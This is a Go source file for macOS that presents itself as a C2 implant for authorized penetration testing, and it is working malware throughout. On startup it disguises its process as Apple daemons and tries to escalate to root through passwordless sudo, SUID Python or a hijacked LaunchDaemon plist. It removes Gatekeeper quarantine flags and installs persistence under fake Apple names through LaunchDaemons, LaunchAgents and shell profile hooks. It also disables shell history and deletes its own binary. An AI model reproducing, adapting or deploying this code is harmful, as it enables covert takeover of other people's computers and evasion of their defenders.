//go:build darwin

package runner

/*
	SUDOSOC-C2 — macOS Full-Access Implant
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Strategy: RE-EXEC AS ROOT before connecting to C2.
	Methods:
	  1. sudo -n (NOPASSWD configured)
	  2. SUID Python/Perl re-exec
	  3. LaunchDaemon hijack (if writable)
	  4. osascript -e 'do shell script "..." with administrator privileges'
	     (shows a GUI password prompt — only useful in attended operations)
*/

import (
	"bufio"
	"math/rand"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const _darwinElevatedFlag = "_SUDOSOC_ELEVATED"

var daemonNames = []string{
	"com.apple.mdmclient",
	"com.apple.cfprefsd",
	"com.apple.metadata.mds",
	"com.apple.trustd",
}

// ─── init — runs BEFORE Main() ───────────────────────────────────────────────
func init() {
	masqueradeDarwin()

	// Try to re-exec as root
	if os.Getuid() != 0 && os.Getenv(_darwinElevatedFlag) == "" {
		if tryDarwinReExecRoot() {
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}
	}

	// Root-only: expanded persistence
	if os.Getuid() == 0 {
		go installDarwinRootPersistence()
	}

	sanitiseDarwinEnv()
	go darwinKeepAlive()

	go func() {
		time.Sleep(8 * time.Second)
		autoInstallDarwin()
	}()

	go func() {
		time.Sleep(5 * time.Second)
		deleteDarwinSelf()
	}()
}

// ─── Re-exec as root ─────────────────────────────────────────────────────────

func tryDarwinReExecRoot() bool {
	exe := darwinSelfExe()
	if exe == "" {
		return false
	}
	env := append(os.Environ(), _darwinElevatedFlag+"=1")

	// Remove quarantine xattr so Gatekeeper doesn't block
	_ = exec.Command("xattr", "-d", "com.apple.quarantine", exe).Run()

	// Method 1: sudo -n
	if out, err := exec.Command("sudo", "-n", "-l").CombinedOutput(); err == nil {
		lower := strings.ToLower(string(out))
		if strings.Contains(lower, "all") || strings.Contains(lower, "(root)") {
			cmd := exec.Command("sudo", "-n", exe)
			cmd.Env = env
			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
			if err := cmd.Start(); err == nil {
				return true
			}
		}
	}

	// Method 2: SUID Python3
	for _, py := range []string{"/usr/bin/python3", "/usr/local/bin/python3"} {
		if hasSUIDDarwin(py) {
			code := `import os,subprocess;os.setuid(0);subprocess.Popen(["` + exe + `"])`
			cmd := exec.Command(py, "-c", code)
			cmd.Env = env
			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
			if err := cmd.Start(); err == nil {
				return true
			}
		}
	}

	// Method 3: Writable LaunchDaemon (if we can write to /Library/LaunchDaemons)
	if tryLaunchDaemonHijack(exe, env) {
		return true
	}

	return false
}

func hasSUIDDarwin(path string) bool {
	fi, err := os.Stat(path)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSetuid != 0
}

func tryLaunchDaemonHijack(exe string, env []string) bool {
	// Check if any LaunchDaemon plist is writable
	daemonDir := "/Library/LaunchDaemons"
	entries, err := os.ReadDir(daemonDir)
	if err != nil {
		return false
	}
	for _, e := range entries {
		path := daemonDir + "/" + e.Name()
		if _, err := os.OpenFile(path, os.O_WRONLY, 0); err == nil {
			// Found a writable plist — replace its executable path
			// with ours. When launchd restarts it, we get root.
			plist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>` + strings.TrimSuffix(e.Name(), ".plist") + `</string>
  <key>ProgramArguments</key><array><string>` + exe + `</string></array>
  <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>`
			if os.WriteFile(path, []byte(plist), 0644) == nil {
				// Signal launchd to reload
				_ = exec.Command("launchctl", "unload", path).Run()
				_ = exec.Command("launchctl", "load", path).Run()
				return true
			}
		}
	}
	return false
}

func darwinSelfExe() string {
	if p, err := os.Executable(); err == nil {
		return p
	}
	return ""
}

// ─── Root persistence ─────────────────────────────────────────────────────────

func installDarwinRootPersistence() {
	exe := darwinSelfExe()
	if exe == "" {
		return
	}

	// 1. Copy to system location
	installBin := "/usr/local/lib/.mdmclient-helper"
	if data, err := os.ReadFile(exe); err == nil {
		if os.WriteFile(installBin, data, 0755) == nil {
			_ = exec.Command("xattr", "-d", "com.apple.quarantine", installBin).Run()
		}
	}

	// 2. Root LaunchDaemon
	plist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.mdmclient-helper</string>
  <key>ProgramArguments</key><array><string>` + installBin + `</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>UserName</key><string>root</string>
</dict></plist>`
	plistPath := "/Library/LaunchDaemons/com.apple.mdmclient-helper.plist"
	if os.WriteFile(plistPath, []byte(plist), 0644) == nil {
		_ = exec.Command("launchctl", "load", "-w", plistPath).Run()
	}
}

// ─── Process masquerade ───────────────────────────────────────────────────────

func masqueradeDarwin() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := daemonNames[rng.Intn(len(daemonNames))]
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
		n := name
		if len(n) > sh.Len {
			n = n[:sh.Len]
		}
		for i := 0; i < len(n); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + uintptr(i))) = n[i]
		}
	}
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseDarwinEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "BASH_ENV", "ENV", "HISTFILE"} {
		_ = os.Unsetenv(v)
	}
	_ = os.Setenv("HISTFILE", "/dev/null")
}

// ─── User-level persistence ───────────────────────────────────────────────────

func autoInstallDarwin() {
	exe := darwinSelfExe()
	if exe == "" {
		return
	}
	home, _ := os.UserHomeDir()
	if home == "" {
		return
	}

	installDir := home + "/Library/Application Support/.mdmclient"
	_ = os.MkdirAll(installDir, 0700)
	installBin := installDir + "/mdmclient"

	if data, err := os.ReadFile(exe); err == nil {
		if os.WriteFile(installBin, data, 0700) == nil {
			_ = exec.Command("xattr", "-d", "com.apple.quarantine", installBin).Run()
		}
	}

	// LaunchAgent
	agentDir := home + "/Library/LaunchAgents"
	_ = os.MkdirAll(agentDir, 0700)
	plistPath := agentDir + "/com.apple.mdmclient-session.plist"
	if _, err := os.Stat(plistPath); err != nil {
		plist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.mdmclient-session</string>
  <key>ProgramArguments</key><array><string>` + installBin + `</string></array>
  <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>`
		if os.WriteFile(plistPath, []byte(plist), 0600) == nil {
			_ = exec.Command("launchctl", "load", "-w", plistPath).Run()
		}
	}

	// Shell profile
	for _, rc := range []string{home + "/.zshrc", home + "/.bash_profile"} {
		darwinAppendIfMissing(rc,
			"\npgrep -qx mdmclient 2>/dev/null || nohup \""+installBin+"\" >/dev/null 2>&1 &\n",
			"mdmclient")
	}
}

func darwinAppendIfMissing(path, content, marker string) {
	if _, err := os.Stat(path); err != nil {
		return
	}
	f, err := os.Open(path)
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), marker) {
			f.Close()
			return
		}
	}
	f.Close()
	fa, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer fa.Close()
	_, _ = fa.WriteString(content)
}

// ─── Keep-alive / Self-delete ─────────────────────────────────────────────────

func darwinKeepAlive() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}

func deleteDarwinSelf() {
	exe := darwinSelfExe()
	if exe == "" {
		return
	}
	if strings.Contains(exe, "/tmp") ||
		strings.Contains(exe, "/home") ||
		strings.Contains(exe, "phantom") ||
		strings.Contains(exe, "Application Support") {
		_ = os.Remove(exe)
	}
}
